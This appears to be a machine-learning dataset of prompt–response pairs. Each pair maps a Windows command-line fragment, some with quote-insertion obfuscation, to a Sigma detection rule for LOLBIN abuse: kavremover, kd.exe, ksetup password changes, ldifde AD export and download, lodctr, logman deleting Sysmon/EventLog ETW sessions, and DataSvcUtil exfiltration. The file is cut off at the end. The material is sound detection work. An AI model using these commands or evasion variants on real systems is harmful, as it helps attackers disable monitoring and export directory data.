{"instruction": "Write Sigma rule to detect payload:", "input": "run run-cmd \\cleanapi.exe \\kavremover.exe", "output": "title: Kavremover Dropped Binary LOLBIN Usage\nid: d047726b-c71c-4048-a99b-2e2f50dc107d\nstatus: test\ndescription: Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\nreferences:\n    - https://nasbench.medium.com/lolbined-using-kaspersky-endpoint-security-kes-installer-to-execute-arbitrary-commands-1c999f1b7fea\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-01\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains: ' run run-cmd '\n    filter_main_legit_parents:\n        ParentImage|endswith:\n            - '\\cleanapi.exe' # When launched from KES installer\n            - '\\kavremover.exe' # When launched from kavremover.exe\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\kd.exe kd.exe", "output": "title: Windows Kernel Debugger Execution\nid: 27ee9438-90dc-4bef-904b-d3ef927f5e7e\nstatus: test\ndescription: Detects execution of the Windows Kernel Debugger \"kd.exe\".\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-15\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\kd.exe'\n        - OriginalFileName: 'kd.exe'\n    condition: selection\nfalsepositives:\n    - Rare occasions of legitimate cases where kernel debugging is necessary in production. Investigation is required\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"k\"\"d\"\".\"\"e\"\"x\"\"e\" kd.exe", "output": "title: Windows Kernel Debugger Execution\nid: 27ee9438-90dc-4bef-904b-d3ef927f5e7e\nstatus: test\ndescription: Detects execution of the Windows Kernel Debugger \"kd.exe\".\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-15\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\kd.exe'\n        - OriginalFileName: 'kd.exe'\n    condition: selection\nfalsepositives:\n    - Rare occasions of legitimate cases where kernel debugging is necessary in production. Investigation is required\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\kd kd", "output": "title: Windows Kernel Debugger Execution\nid: 27ee9438-90dc-4bef-904b-d3ef927f5e7e\nstatus: test\ndescription: Detects execution of the Windows Kernel Debugger \"kd.exe\".\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-15\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\kd.exe'\n        - OriginalFileName: 'kd.exe'\n    condition: selection\nfalsepositives:\n    - Rare occasions of legitimate cases where kernel debugging is necessary in production. Investigation is required\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\kd.exe kd.exe", "output": "title: Windows Kernel Debugger Execution\nid: 27ee9438-90dc-4bef-904b-d3ef927f5e7e\nstatus: test\ndescription: Detects execution of the Windows Kernel Debugger \"kd.exe\".\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-15\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\kd.exe'\n        - OriginalFileName: 'kd.exe'\n    condition: selection\nfalsepositives:\n    - Rare occasions of legitimate cases where kernel debugging is necessary in production. Investigation is required\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup.exe ksetup.exe /setcomputerpassword", "output": "title: Computer Password Change Via Ksetup.EXE\nid: de16d92c-c446-4d53-8938-10aeef41c8b6\nstatus: test\ndescription: Detects password change for the computer's domain account or host principal via \"ksetup.exe\"\nreferences:\n    - https://twitter.com/Oddvarmoe/status/1641712700605513729\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /setcomputerpassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup.exe \\\"ksetup.exe\\\" /setcomputerpassword", "output": "title: Computer Password Change Via Ksetup.EXE\nid: de16d92c-c446-4d53-8938-10aeef41c8b6\nstatus: test\ndescription: Detects password change for the computer's domain account or host principal via \"ksetup.exe\"\nreferences:\n    - https://twitter.com/Oddvarmoe/status/1641712700605513729\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /setcomputerpassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup ksetup /setcomputerpassword", "output": "title: Computer Password Change Via Ksetup.EXE\nid: de16d92c-c446-4d53-8938-10aeef41c8b6\nstatus: test\ndescription: Detects password change for the computer's domain account or host principal via \"ksetup.exe\"\nreferences:\n    - https://twitter.com/Oddvarmoe/status/1641712700605513729\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /setcomputerpassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup.exe ksetup.exe /setcomputerpassword", "output": "title: Computer Password Change Via Ksetup.EXE\nid: de16d92c-c446-4d53-8938-10aeef41c8b6\nstatus: test\ndescription: Detects password change for the computer's domain account or host principal via \"ksetup.exe\"\nreferences:\n    - https://twitter.com/Oddvarmoe/status/1641712700605513729\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /setcomputerpassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup.exe ksetup.exe /ChangePassword", "output": "title: Logged-On User Password Change Via Ksetup.EXE\nid: c9783e20-4793-4164-ba96-d9ee483992c4\nstatus: test\ndescription: Detects password change for the logged-on user's via \"ksetup.exe\"\nreferences:\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /ChangePassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\ksetup.exe\\\" ksetup.exe /ChangePassword", "output": "title: Logged-On User Password Change Via Ksetup.EXE\nid: c9783e20-4793-4164-ba96-d9ee483992c4\nstatus: test\ndescription: Detects password change for the logged-on user's via \"ksetup.exe\"\nreferences:\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /ChangePassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup ksetup /ChangePassword", "output": "title: Logged-On User Password Change Via Ksetup.EXE\nid: c9783e20-4793-4164-ba96-d9ee483992c4\nstatus: test\ndescription: Detects password change for the logged-on user's via \"ksetup.exe\"\nreferences:\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /ChangePassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ksetup.exe ksetup.exe /ChangePassword", "output": "title: Logged-On User Password Change Via Ksetup.EXE\nid: c9783e20-4793-4164-ba96-d9ee483992c4\nstatus: test\ndescription: Detects password change for the logged-on user's via \"ksetup.exe\"\nreferences:\n    - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-06\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ksetup.exe'\n        - OriginalFileName: 'ksetup.exe'\n    selection_cli:\n        CommandLine|contains: ' /ChangePassword '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe ldifde.exe -f -i", "output": "title: Active Directory Structure Export Via Ldifde.EXE\nid: 4f7a6757-ff79-46db-9687-66501a02d9ec\nstatus: test\ndescription: Detects the execution of \"ldifde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ldif:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cmd:\n        CommandLine|contains: '-f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe ldifde.exe \\\"-f\\\" -i", "output": "title: Active Directory Structure Export Via Ldifde.EXE\nid: 4f7a6757-ff79-46db-9687-66501a02d9ec\nstatus: test\ndescription: Detects the execution of \"ldifde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ldif:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cmd:\n        CommandLine|contains: '-f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde ldifde -f -i", "output": "title: Active Directory Structure Export Via Ldifde.EXE\nid: 4f7a6757-ff79-46db-9687-66501a02d9ec\nstatus: test\ndescription: Detects the execution of \"ldifde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ldif:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cmd:\n        CommandLine|contains: '-f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe ldifde.exe -i -f", "output": "title: Active Directory Structure Export Via Ldifde.EXE\nid: 4f7a6757-ff79-46db-9687-66501a02d9ec\nstatus: test\ndescription: Detects the execution of \"ldifde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_ldif:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cmd:\n        CommandLine|contains: '-f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe ldifde.exe -i -f", "output": "title: Import LDAP Data Interchange Format File Via Ldifde.EXE\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nstatus: test\ndescription: |\n    Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server.\nreferences:\n    - https://twitter.com/0gtweet/status/1564968845726580736\n    - https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: '@gott_cyber'\ndate: 2022-09-02\nmodified: 2023-03-14\ntags:\n    - attack.command-and-control\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-i'\n            - '-f'\n    condition: all of selection_*\nfalsepositives:\n    - Since the content of the files are unknown, false positives are expected\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe \"l\"\"d\"\"i\"\"f\"\"d\"\"e\"\".\"\"e\"\"x\"\"e\" -i -f", "output": "title: Import LDAP Data Interchange Format File Via Ldifde.EXE\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nstatus: test\ndescription: |\n    Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server.\nreferences:\n    - https://twitter.com/0gtweet/status/1564968845726580736\n    - https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: '@gott_cyber'\ndate: 2022-09-02\nmodified: 2023-03-14\ntags:\n    - attack.command-and-control\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-i'\n            - '-f'\n    condition: all of selection_*\nfalsepositives:\n    - Since the content of the files are unknown, false positives are expected\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde ldifde -i -f", "output": "title: Import LDAP Data Interchange Format File Via Ldifde.EXE\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nstatus: test\ndescription: |\n    Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server.\nreferences:\n    - https://twitter.com/0gtweet/status/1564968845726580736\n    - https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: '@gott_cyber'\ndate: 2022-09-02\nmodified: 2023-03-14\ntags:\n    - attack.command-and-control\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-i'\n            - '-f'\n    condition: all of selection_*\nfalsepositives:\n    - Since the content of the files are unknown, false positives are expected\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ldifde.exe ldifde.exe -f -i", "output": "title: Import LDAP Data Interchange Format File Via Ldifde.EXE\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nstatus: test\ndescription: |\n    Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server.\nreferences:\n    - https://twitter.com/0gtweet/status/1564968845726580736\n    - https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nauthor: '@gott_cyber'\ndate: 2022-09-02\nmodified: 2023-03-14\ntags:\n    - attack.command-and-control\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ldifde.exe'\n        - OriginalFileName: 'ldifde.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-i'\n            - '-f'\n    condition: all of selection_*\nfalsepositives:\n    - Since the content of the files are unknown, false positives are expected\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\lodctr.exe LODCTR.EXE -r", "output": "title: Rebuild Performance Counter Values Via Lodctr.EXE\nid: cc9d3712-6310-4320-b2df-7cb408274d53\nstatus: test\ndescription: Detects the execution of \"lodctr.exe\" to rebuild the performance counter registry values. This can be abused by attackers by providing a malicious config file to overwrite performance counter configuration to confuse and evade monitoring and security solutions.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\nmodified: 2024-03-05\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\lodctr.exe'\n        OriginalFileName: 'LODCTR.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\lodctr.exe LODCT\"R.EXE\" -r", "output": "title: Rebuild Performance Counter Values Via Lodctr.EXE\nid: cc9d3712-6310-4320-b2df-7cb408274d53\nstatus: test\ndescription: Detects the execution of \"lodctr.exe\" to rebuild the performance counter registry values. This can be abused by attackers by providing a malicious config file to overwrite performance counter configuration to confuse and evade monitoring and security solutions.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\nmodified: 2024-03-05\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\lodctr.exe'\n        OriginalFileName: 'LODCTR.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\lodctr LODCTR -r", "output": "title: Rebuild Performance Counter Values Via Lodctr.EXE\nid: cc9d3712-6310-4320-b2df-7cb408274d53\nstatus: test\ndescription: Detects the execution of \"lodctr.exe\" to rebuild the performance counter registry values. This can be abused by attackers by providing a malicious config file to overwrite performance counter configuration to confuse and evade monitoring and security solutions.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\nmodified: 2024-03-05\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\lodctr.exe'\n        OriginalFileName: 'LODCTR.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\lodctr.exe LODCTR.EXE -r", "output": "title: Rebuild Performance Counter Values Via Lodctr.EXE\nid: cc9d3712-6310-4320-b2df-7cb408274d53\nstatus: test\ndescription: Detects the execution of \"lodctr.exe\" to rebuild the performance counter registry values. This can be abused by attackers by providing a malicious config file to overwrite performance counter configuration to confuse and evade monitoring and security solutions.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\nmodified: 2024-03-05\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\lodctr.exe'\n        OriginalFileName: 'LODCTR.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\logman.exe Logman.exe stop delete Circular Kernel Context Logger EventLog- SYSMON TRACE SysmonDnsEtwSession", "output": "title: Suspicious Windows Trace ETW Session Tamper Via Logman.EXE\nid: cd1f961e-0b96-436b-b7c6-38da4583ec00\nstatus: test\ndescription: Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\nreferences:\n    - https://twitter.com/0gtweet/status/1359039665232306183?s=21\n    - https://ss64.com/nt/logman.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-11\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\n    - attack.t1070.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\logman.exe Logman.exe stop delete Circular Kernel Context Logger Even\\\"tLog-\\\" SYSMON TRACE SysmonDnsEtwSession", "output": "title: Suspicious Windows Trace ETW Session Tamper Via Logman.EXE\nid: cd1f961e-0b96-436b-b7c6-38da4583ec00\nstatus: test\ndescription: Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\nreferences:\n    - https://twitter.com/0gtweet/status/1359039665232306183?s=21\n    - https://ss64.com/nt/logman.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-11\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\n    - attack.t1070.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\logman Logman stop delete Circular Kernel Context Logger EventLog- SYSMON TRACE SysmonDnsEtwSession", "output": "title: Suspicious Windows Trace ETW Session Tamper Via Logman.EXE\nid: cd1f961e-0b96-436b-b7c6-38da4583ec00\nstatus: test\ndescription: Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\nreferences:\n    - https://twitter.com/0gtweet/status/1359039665232306183?s=21\n    - https://ss64.com/nt/logman.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-11\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\n    - attack.t1070.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\logman.exe Logman.exe stop delete Circular Kernel Context Logger EventLog- SYSMON TRACE SysmonDnsEtwSession", "output": "title: Suspicious Windows Trace ETW Session Tamper Via Logman.EXE\nid: cd1f961e-0b96-436b-b7c6-38da4583ec00\nstatus: test\ndescription: Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\nreferences:\n    - https://twitter.com/0gtweet/status/1359039665232306183?s=21\n    - https://ss64.com/nt/logman.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-11\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\n    - attack.t1070.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\logman.exe'\n        - OriginalFileName: 'Logman.exe'\n    selection_action:\n        CommandLine|contains:\n            - 'stop '\n            - 'delete '\n    selection_service:\n        CommandLine|contains:\n            - 'Circular Kernel Context Logger'\n            - 'EventLog-' # Cover multiple traces starting with EventLog-*\n            - 'SYSMON TRACE'\n            - 'SysmonDnsEtwSession'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate deactivation by administrative staff\n    - Installer tools that disable services, e.g. before log collection agent installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/in: /out: /uri: \\DataSvcUtil.exe DataSvcUtil.exe", "output": "title: LOLBAS Data Exfiltration by DataSvcUtil.exe\nid: e290b10b-1023-4452-a4a9-eb31a9013b3a\nstatus: test\ndescription: Detects when a user performs data exfiltration by using DataSvcUtil.exe\nreferences:\n    - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services\n    - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/\nauthor: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: 